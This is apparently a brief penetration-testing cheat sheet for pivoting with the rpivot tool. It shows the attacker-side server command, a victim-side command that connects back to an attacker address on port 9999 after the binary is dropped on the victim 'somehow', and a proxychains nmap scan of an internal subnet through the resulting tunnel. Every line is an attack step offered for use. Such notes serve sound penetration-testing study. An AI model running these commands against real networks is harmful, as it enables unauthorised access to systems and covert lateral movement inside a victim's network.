# Attacker
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080

# Victim. You must drop rpivot.exe/client.exe in there somehow!
rpivot.exe --server-ip 10.11.0.45 --server-port 9999

# Nmap attack

proxychains nmap -sT -Pn -vv 10.1.1.0/24 -oX rpivotscan.xml 2>&1 | tee rpivotscan.xml.txt

